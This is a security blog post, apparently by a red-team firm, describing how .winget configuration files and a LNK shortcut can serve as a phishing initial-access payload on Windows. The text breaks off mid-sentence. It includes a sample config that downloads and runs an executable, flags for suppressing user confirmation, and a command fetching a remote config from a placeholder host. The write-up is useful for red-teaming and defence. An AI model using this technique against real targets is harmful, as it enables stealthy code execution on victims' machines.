---
title: WinGet Desired State: Initial Access Established
url: https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/
source: Over Security - Cybersecurity news aggregator
date: 2026-03-03
fetch_date: 2026-03-04T04:04:22.586391
---

# WinGet Desired State: Initial Access Established

## [Compass Security Blog](https://blog.compass-security.com "Compass Security Blog — Offensive Defense")

### Offensive Defense

* [Home](https://blog.compass-security.com/)
* [Archive](https://blog.compass-security.com/archive/)
* [Contact](https://blog.compass-security.com/contact/)
* [Newsletter](https://blog.compass-security.com/mailing-list-tigerinfo/)

* [Home](https://blog.compass-security.com/)
* [Archive](https://blog.compass-security.com/archive/)
* [Contact](https://blog.compass-security.com/contact/)
* [Newsletter](https://blog.compass-security.com/mailing-list-tigerinfo/)

# [WinGet Desired State: Initial Access Established](https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/ "WinGet Desired State: Initial Access Established")

[March 3, 2026](https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/ "WinGet Desired State: Initial Access Established")
 /
[Marc Tanner](https://blog.compass-security.com/author/mtanner/ "Posts by Marc Tanner")
 /
[0 Comments](https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/#respond)

> TL;DR: While not new, a self-referencing LNK file in combination with winget configuration instructions can be a viable initial access payload for environments where the Microsoft Store is not disabled.

When tasked to design a payload for an initial access scenario for a [red teaming project](https://www.compass-security.com/en/services/red-teaming), we typically look for inspiration in:

* Associated file extensions
* Registered protocol handlers
* Black lists used by popular applications such as [Microsoft Edge](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-security-downloads-interruptions) and [Outlook](https://support.microsoft.com/en-us/office/blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519#ID0EFF)
* Known [abused file types](https://filesec.io/) by threat actors

That is when my colleague Sylvain noticed the `.winget` extension mapped to the following command, allowing easy execution with a double click:

```
winget.exe configure "%1" --wait
```

While the [abuse potential of winget](https://www.zerosalarium.com/2024/12/LOLBIN%20WinGet%20execute%20PowerShell%20script.html) is not new, it seems to be largely neglected by the defensive security community. This is also indicated by its absence from the aforementioned dangerous file block lists. A reason might be that the legitimate functionality is actively [promoted by Microsoft](https://learn.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code?pivots=vscode#installation-instructions) to install e.g., developer dependencies in a streamlined way:

[![](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-ms-instructions-1024x410.png)](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-ms-instructions.png)

[Microsoft instruction to install developer dependencies](https://learn.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code?pivots=vscode#installation-instructions)

From an offensive security perspective it is convenient that the Mark of the Web (MoTW) is not taken into consideration and no [SmartScreen](https://learn.microsoft.com/en-us/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/) integration seems to exist.

## Quick Introduction

So what is the [winget configuration functionality](https://learn.microsoft.com/en-us/windows/package-manager/configuration/)? It is built upon [(PowerShell) Desired State Configuration (DSC)](https://learn.microsoft.com/en-us/powershell/dsc/overview) a declarative system configuration management platform. If you are familiar with Ansible, similar concepts apply where individual, ideally idempotent, configuration steps should result in a consistent system state.

The configure component requires extended features, which if needed, can be enabled from a low-privileged user context with:

```
winget configure --enable
```

The [default resources](https://learn.microsoft.com/en-us/powershell/dsc/reference/psdscresources/overview?view=dsc-2.0#resources) facilitate access to environment variables and the registry, support archive extraction and process creation as well as PowerShell script execution. More than enough functionality to [phish for persistence](https://medium.com/%40matterpreter/hang-fire-challenging-our-mental-model-of-initial-access-513c71878767) using one of the [numerous techniques](https://www.hexacorn.com/blog/2017/01/28/beyond-good-ol-run-key-all-parts/). As a basic example the following configuration file downloads and runs Sysinternals’ Process Explorer:

```
properties:
  configurationVersion: 0.2.0
  resources:
    - resource: PSDscResources/Script
      directives:
        description: Download ProcessExplorer.zip from remote URL
      settings:
        SetScript: "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/ProcessExplorer.zip' -OutFile 'C:\\Windows\\Temp\\ProcessExplorer.zip' -UseBasicParsing"
        GetScript: $false
        TestScript: $false
    - resource: PSDscResources/Archive
      directives:
        description: Extract ProcessExplorer.zip
      settings:
        Path: C:\Windows\Temp\ProcessExplorer.zip
        Destination: C:\Windows\Temp\Extracted
        Ensure: Present
    - resource: PSDscResources/WindowsProcess
      directives:
        description: Run ProcessExplorer.exe from extracted archive
      settings:
        Path: C:\Windows\Temp\Extracted\procexp64.exe
        Arguments: "-accepteula"
```

From an offensive security perspective winget is a nice proxy for PowerShell execution using legitimate system functionality intended for configuration tasks. The underlying system changes are performed by the `ConfigurationRemotingServer.exe` process. This has some similarities to scripts being deployed using SCCM where they are executed through `CcmExec.exe` and often less scrutinized. If needed, all referenced PowerShell resources are automatically downloaded from the [PowerShell Gallery](https://www.powershellgallery.com/packages?q=Tags%3A%22DSC%22) and stored in `%LOCALAPPDATA%\Microsoft\WinGet\Configuration\Modules`.

From an end-user point of view double clicking such a `.winget` file looks as follows:

[![](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-double-click-confirmed2-1024x966.png)](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-double-click-confirmed2.png)

Standard behavior when opening a `.winget` file.

When attempting to convince a phishing target to execute such a payload, there are a number of undesirable properties:

* The user has to explicitly confirm the installation by entering `Y` (or `y`, case does not matter)
* There is lots of confusing text being displayed
* Due to the `--wait` command line option, the console application remains open after execution

## Reducing Required User Interaction

Explicit user input can be avoided by either:

* Launching winget with the option `--accept-configuration-agreements`
* Supplying the required confirmation input in some other form e.g., `echo y | winget ...`

The output can be suppressed by redirecting it to `>nul`.

All these options require direct control of the winget invocation which means the configuration file can no longer be used on its own, but needs to be applied through some trigger file. The most obvious approach is to use a LNK shortcut. This replaces the need for interactive keyboard input with an additional MoTW related security warning dialog which end users are hopefully more likely to accept. Because winget also applies configurations hosted on web servers, the first attempt was to use a shortcut executing:

```
winget configure https://yourhost.tld/burpisnotbeef.yml --accept-configuration-agreements
```

While the LNK contained within a ZIP archive could be del...